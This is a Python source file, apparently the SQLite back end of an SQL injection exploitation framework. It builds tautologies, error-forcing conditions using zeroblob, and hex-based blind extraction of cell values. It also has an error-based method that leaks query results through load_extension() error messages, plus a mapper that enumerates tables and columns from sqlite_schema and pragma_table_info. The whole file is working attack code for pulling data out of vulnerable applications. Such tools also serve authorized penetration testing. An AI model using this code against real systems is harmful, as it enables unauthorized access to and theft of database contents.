import operator
import string
from functools import reduce

from ending.ast import *
from ending.ast import Length, Node, Query
from ending.db import generic
from ending.db.generic.map import Map, MapDepth, MapQueryListener
from ending.db.generic.method import InjectForBytes
from ending.exception import ConversionError
from ending.struct.metadata import Context, QueryState
from ending.util import quoting
from ending.util.typing import Any

__all__ = [
    "Compiler",
    "SelectMethod",
    "LoadExtensionMethod",
    "TestMethod",
    "BlobCellFetcher",
    "Mapper",
    "Features",
]


class Features(generic.Features):
    name = "SQLite3"
    tautology = "sqlite_version()=sqlite_version()"
    quoters = [
        quoting.singlequote,
        quoting.doublequote,
        quoting.char,
        quoting.pipes_char,
    ]
    # NOTE In old versions of SQLite, the `zeroblob()` if condition involves a subquery,
    # this does not work.
    error_condition: str = (
        "(CASE WHEN {condition} THEN zeroblob(1000000000000) ELSE {result} END)"
    )


class Compiler(generic.Compiler):
    """Compiler for SQLite."""

    def serialize(self, node: Node) -> Node:
        match node.metadata.type:
            case TextType():
                return node
            case BlobType():
                return Hex(node)
            case BoolType() | IntType() as tpe:
                return node.with_type(tpe.to_texttype())
            case tpe:
                raise ConversionError(f"Cannot serialize type: {type(tpe).__name__}")

    def _adjust_column(self, column: Node) -> Node:
        # Casting to blob properly converts every type to a blob
        match column.metadata.type:
            case UnknownType():
                return Cast(column, "BLOB", type=BlobType())
            case _:
                return column

    def compile_Query(self, query: Query, s: str) -> str:
        b = []
        q = query.q
        assert len(q.columns) > 0, "Query contains no columns"

        # If the query only consists of one column and nothing else, the SELECT
        # keyword is inessential and can be removed if it is a subquery
        if (
            "p" in s
            and len(q.columns) == 1
            and not (q.distinct or q.table or q.where or q.order or q.limit)
        ):
            return f"{q.columns[0]:p}"

        b.append("SELECT")

        if q.distinct:
            b.append("DISTINCT")

        b.append(self.compile(List[Identifier](q.columns)))

        if q.table:
            b.append(f"FROM {q.table}")

        if q.where:
            b.append(f"WHERE {q.where}")

        if q.order:
            b.append(f"ORDER BY {q.order}")

        if q.limit:
            b.append(f"{q.limit}")

        query = " ".join(b)

        if "p" in s:
            return f"({query})"
        return query

    def compile_Concatenation(self, c: Concatenation, s):
        if not c.nodes:
            return Value("")
        return "||".join(
            f"{node:p}" if not isinstance(node, Comparison) else f"({node})"
            for node in c.nodes
        )

    def compile_Ord(self, ord: Ord, s: str):
        match ord.node.metadata.type:
            case BlobType():
                raise ValueError(
                    "Ord() function has no equivalent for bytes in SQLite3"
                )
            case _:
                return Function["unicode"](ord.node)

    def compile_Substring(self, substring: Substring, s):
        return super().compile_Substring(substring, s, "SUBSTR")

    def compile_Length(self, length: Length, s):
        return Function["LENGTH"](length.node)


# SQLite HEX(NULL) is not null but an empty string. To discriminate between the two,
# we need to coalesce BEFORE we convert to hex, which changes a few things.
class SelectMethod(generic.HexSelectMethod):
    tag_hex_null = generic.RandomTag()

    def serialize_cell(self, column: Node) -> Node:
        if column.metadata.nullable:
            match column.metadata.type:
                case BlobType():
                    column = Function["COALESCE"](
                        column, Value(self.tag_hex_null), type=BlobType()
                    )
                    return self.compiler.serialize(column)
                case TextType() if self.hex:
                    column = Function["COALESCE"](
                        column, Value(self.tag_hex_null), type=TextType()
                    )
                    return Hex(column)
        return super().serialize_cell(column)

    def deserialize_cell(self, column: Node, cell: bytes) -> Any:
        match column.metadata.type:
            case BlobType() as tpe:
                cell = self.compiler.deserialize(tpe, cell)
                if column.metadata.nullable and cell == self.tag_hex_null.encode():
                    return None
                return cell
            case TextType() if self.hex:
                cell = super().deserialize_cell(column, cell)
                if column.metadata.nullable and cell == self.tag_hex_null:
                    return None
                return cell
            case _:
                return super().deserialize_cell(column, cell)


class BlobCellFetcher(generic.BlobCellFetcher):
    __cache = {}

    async def get_candidates(self, expr: Node) -> tuple[str]:
        return tuple(f"{byte:02X}" for byte in expr.metadata.type.byteset)

    async def fetch_part_is_in(
        self, expression: Node, candidates: frozenset[str], negate: bool = False
    ) -> bool:
        candidates = self._get_list_of_candidates(candidates)
        payload = Hex(expression).is_in(candidates, negate=negate)
        return await self.method.inject(payload)

    def cast_part(self, result: str) -> bytes:
        """Converts the result of the polytomy into a proper value."""
        return bytes.fromhex(result)


class TestMethod(generic.TestMethod):
    def setup_fetchers(self) -> None:
        super().setup_fetchers()
        self.fetcher_blob = BlobCellFetcher(self)


class LoadExtensionMethod(generic.ErrorBasedMethod):
    """Uses the `load_extension()` SQLite method to retrieve data."""

    size = 250
    pattern = "stepping, /(.*).so:"

    def __init__(
        self,
        compiler: Compiler,
        inject: InjectForBytes,
    ):
        super().__init__(
            compiler,
            inject,
            size=250,
            pattern=rb"stepping, /.{,250}.so:",
        )

    def build_payload(self, query: Query, position: int) -> Node:
        payload = super().build_payload(query, position)
        payload = Function["load_extension"](Concatenation(("/", payload)))
        return payload


def _take(filters: dict[str, str], *keys: str) -> tuple[str, ...]:
    """Extracts values from a dictionary based on the provided keys.
    Returns a tuple of values corresponding to the keys."""
    return tuple(filters.get(key, None) for key in keys)


class Mapper(generic.Mapper):
    _ROOT_DB = "root"
    FIELD_NAME = Identifier(
        "name", type=TextType(charset=string.ascii_letters + string.digits + "_-")
    )
    FIELD_TYPE = Identifier(
        "type",
        type=TextType(charset=string.ascii_letters + string.digits + " _-()'"),
    )
    SCHEMA = Identifier("sqlite_schema")

    def _columns_query(
        self, table: Node, with_types: bool, filters: dict[str, str]
    ) -> Query:
        """Builds the query that returns column names and types for a given table."""

        query = Query().table(Function["pragma_table_info"](table))
        if with_types:
            query = query.columns(self.FIELD_NAME, self.FIELD_TYPE)
        else:
            query = query.columns(self.FIELD_NAME)

        conditions = []
        if filters["column"]:
            conditions.append(self._build_condition(self.FIELD_NAME, filters["column"]))
        # FUTURE
        # if filters["type"]:
        #     conditions.append(self._build_condition(self.FIELD_TYPE, filters["type"]))

        if conditions:
            conditions = reduce(operator.__and__, conditions)
            query = query.where(conditions)

        return query

    def _count_query(self, query: Query) -> Query:
        """Builds a query that ensures the number of rows returned by the given query
        if not zero."""
        return query.columns(Count() != 0)

    async def _fetch_tables(self, ctx: Context, **filters: str) -> Map:
        """Fetches the tables in the SQLite database."""
        ctx = ctx.with_(depth="tables")
        ctx.notify("dump:start")
        f_db, f_table, f_column = _take(filters, "database", "table", "column")

        assert not (
            f_db and f_db != self._ROOT_DB
        ), "SQLite mapping cannot be filtered by database"

        conditions = Identifier("type") == "table"

        if f_table:
            conditions &= self._build_condition(self.FIELD_NAME, f_table)

        # Get column details from pragma_table_info(table_name)
        if f_column:
            tb_table = Alias.randomized(self.SCHEMA)
            # TODO Identifier should contain dot, use another class for that
            # For instance, Dot(Identifier("sqlite_schema"), Identifier("name"))
            # or something like that
            self.method.compiler.wrap(tb_table.alias)
            self.method.compiler.wrap(self.FIELD_NAME)
            sub_column = Identifier(f"{tb_table.alias}.{self.FIELD_NAME}")
            sub_query = self._columns_query(
                sub_column, with_types=False, filters=filters
            )
            sub_query = self._count_query(sub_query)
            conditions &= sub_query
        else:
            tb_table = self.SCHEMA

        # Build the query to fetch table names

        if self._is_filter_exact(f_table):
            query = Query(tb_table).columns(Count(self.FIELD_NAME)).where(conditions)
            query = Query().columns(query != 0)
            results = await self.method.fetch(query)
            results = [[f_table]] if results.data[0][0] else []
        else:
            query = Query(tb_table).columns(self.FIELD_NAME).where(conditions)
            results = await self.method.fetch(query, listener=MapQueryListener(ctx))
            results = results.data
        ctx.notify("dump:done", results=results)

        return results

    async def _fetch(self, depth: MapDepth, ctx: Context, **filters: str) -> Map:
        ctx = ctx.with_(database=self._ROOT_DB)

        if filters["database"] and filters["database"] != self._ROOT_DB:
            raise NotImplementedError("SQLite mapping cannot be filtered by database")

        map = Map()

        match depth:
            case "databases":
                map.add(self._ROOT_DB)
            case "tables":
                results = await self._fetch_tables(ctx, **filters)
                map.radd(self._ROOT_DB, results)
            case "columns" | "types":
                map = Map()

                tables = await self._fetch_tables(ctx, **filters)

                ctx.notify("iter:start", depth="tables", count=len(tables))

                for (table,) in tables:
                    ctx.notify("iter:current", depth="tables", table=table)

                    table_ctx = ctx.with_(table=table, depth=depth)
                    table_ctx.notify("dump:start")

                    # The column filter was used to filter the tables already, so if it
                    # is exact we know that the current table contains a column which
                    # that name
                    if depth == "columns" and self._is_filter_exact(
                        filters.get("column")
                    ):
                        results = [[filters["column"]]]
                    else:
                        query = self._columns_query(
                            table, with_types=(depth == "types"), filters=filters
                        )
                        results = await self.method.fetch(
                            query, listener=MapQueryListener(table_ctx)
                        )
                        results = results.data

                    table_ctx.notify("dump:done", results=results)
                    map.radd(self._ROOT_DB, table, results)

                ctx.notify("iter:done", depth="tables")

        return map
